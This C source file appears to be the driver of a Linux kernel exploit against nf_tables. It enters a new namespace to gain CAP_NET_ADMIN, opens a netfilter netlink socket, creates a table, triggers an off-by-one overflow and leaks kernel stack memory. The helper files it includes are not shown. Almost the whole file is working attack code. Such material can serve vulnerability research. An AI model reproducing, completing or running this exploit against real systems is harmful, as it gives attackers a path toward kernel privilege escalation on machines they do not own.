#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>
#include <sys/socket.h>
#include <linux/netlink.h>

#include "log.h"
#include "leak.h"
#include "util.h"
#include "nf_tables.h"

#define TABLE "table\0\0\0"
#define LEAK "leak\0\0\0\0"

int main(int argc, char **argv) {
    int sock;
    struct sockaddr_nl snl;
    long *stack_leak;

    new_ns();
    printf("[+] Get CAP_NET_ADMIN capabilities\n");

    // Socket creation
    if ((sock = socket(AF_NETLINK, SOCK_DGRAM, NETLINK_NETFILTER)) < 0) {
        do_error_exit("socket");
    }
    printf("[+] Netlink socket created\n");

    // Binding
    memset(&snl, 0, sizeof(snl));
    snl.nl_family = AF_NETLINK;
    snl.nl_pid = getpid();
    if (bind(sock, (struct sockaddr *)&snl, sizeof(snl)) < 0) {
        do_error_exit("bind");
    }
    printf("[+] Netlink socket bound\n");

    // Create a table
    create_table(sock, TABLE);
    printf("[+] Table created\n");

    /* Leak preparation */
    trigger_bof(sock, NULL, 0, LEAK_SIZE, LEAK, TABLE, 0x1337);
    printf("[+] Off-by-one for leak done\n");

    /* Stack leak */
    get_leak(sock, TABLE, LEAK);
    printf("[+] Leak done !\n");

    return EXIT_SUCCESS;
}
